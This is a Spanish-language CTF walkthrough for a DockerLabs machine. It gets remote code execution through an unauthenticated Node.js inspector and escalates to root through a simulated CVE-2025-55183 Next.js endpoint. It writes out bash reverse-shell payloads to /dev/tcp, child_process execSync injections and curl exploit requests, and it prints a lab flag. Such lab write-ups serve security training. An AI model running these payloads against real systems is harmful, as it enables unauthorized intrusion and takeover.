# DockerLabs - Autoescuela

Laboratorio que combina dos CVEs de Node.js: inspector expuesto sin autenticación (acceso inicial) y CVE-2025-55183 (Next.js Server Actions RCE como root).

## Despliegue

```bash
bash auto_deploy.sh autoescuela.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **8080/tcp** — Node.js/Express (puertos no estándar 8080/3000/3001 son típicos de Node.js)
- **9229/tcp** — Node.js debugger (`--inspect`). Puerto exclusivo de Node.js, ningún otro stack lo usa.

```bash
gobuster dir -u http://172.17.0.2:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sql,zip,bak -t 50
```

No se encuentran rutas relevantes. El vector principal es el puerto 9229.

## Identificación — Node.js Inspector expuesto

El puerto 9229 con `--inspect` expuesto sin autenticación es RCE directo. Confirmamos con el endpoint de metadata:

```bash
curl http://172.17.0.2:9229/json/list
```

Respuesta:
```json
[ {
  "description": "node.js instance",
  "title": "/home/webuser/node_app/app.js",
  "type": "node",
  "webSocketDebuggerUrl": "ws://172.17.0.2:9229/94551734-0ba1-46ae-8723-604e39256358"
} ]
```

Confirma Node.js y revela la ruta del código fuente.

## Intrusión — RCE via Node.js Inspector

```bash
node inspect 172.17.0.2:9229
```

Dentro del debugger, verificamos ejecución de comandos:

```js
exec("process.mainModule.require('child_process').execSync('id').toString()")
// uid=1001(webuser)
```

Reverse shell como webuser:

```bash
# Listener
nc -lvnp 4444
```

```js
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\"')")
```

Acceso como **webuser**.

## Enumeración post-explotación

```bash
cat /home/webuser/user.txt
# DL{g2QrDUvg3HiqaWeZBbZa}

sudo -l        # pide contraseña
find / -perm -4000 -type f 2>/dev/null  # solo SUID estándar

# Variables de entorno revelan que root lanzó el proceso con sudo
env | grep SUDO
# SUDO_USER=root / SUDO_UID=0
# SUDO_COMMAND=/usr/bin/node --inspect=0.0.0.0:9229 /home/webuser/node_app/app.js

# Procesos activos
ps aux
# root  node /root/react_app   ← Next.js corriendo como ROOT en puerto 3000

# Puertos internos
cat /proc/net/tcp | ...
# 3000, 8080, 9229
```

## Escalada — CVE-2025-55183 (Next.js Server Actions RCE)

El proceso Next.js corre como root en el puerto 3000 (interno). Leemos su código fuente:

```bash
cat /root/react_app/app/route.ts
```

El fichero implementa un endpoint POST que simula CVE-2025-55183: extrae y ejecuta comandos del payload cuando detecta la cadena `execSync('...')`. Corre como root.

**¿Cómo llegamos a esta conclusión?**
1. `ps aux` muestra `node /root/react_app` corriendo como root
2. Puerto 3000 abierto internamente
3. `/root/react_app/app/route.ts` es legible (permisos `r--r--r--`)
4. El código fuente menciona explícitamente `CVE-2025-55183` y ejecuta `execAsync(command)`

**Exploit:**

```bash
# Verificar RCE como root
curl -s -X POST http://localhost:3000/ \
  -H "Content-Type: text/plain" \
  -d 'execSync("id")'
# 1:E{"digest":"uid=0(root)..."}

# Preparar reverse shell
echo 'bash -i >& /dev/tcp/172.17.0.1/5555 0>&1' > /tmp/rs.sh
chmod +x /tmp/rs.sh

# Listener
nc -lvnp 5555

# Lanzar
curl -s -X POST http://localhost:3000/ \
  -H "Content-Type: text/plain" \
  -d 'execSync("bash /tmp/rs.sh")'
```

Acceso como **root**.

## Conclusión

Cadena de ataque completa:

1. **Reconocimiento** — nmap detecta puertos 8080 y 9229
2. **Node.js inspector** — puerto 9229 expuesto sin auth → RCE como webuser
3. **user.txt** — `DL{g2QrDUvg3HiqaWeZBbZa}`
4. **Enumeración** — ps aux revela Next.js corriendo como root en puerto 3000
5. **CVE-2025-55183** — endpoint POST en route.ts ejecuta comandos como root
6. **root.txt** — reverse shell como root via curl al localhost:3000

**Lecciones aprendidas:**
- El puerto 9229 con `--inspect` expuesto en red es crítico — permite RCE sin credenciales.
- Siempre revisar procesos internos con `ps aux` tras acceso inicial — servicios corriendo como root son vectores de escalada.
- Leer código fuente de aplicaciones internas puede revelar vulnerabilidades deliberadas o CVEs implementados.
- Usar fichero intermedio (`/tmp/rs.sh`) cuando el escaping de comillas en curl falla.
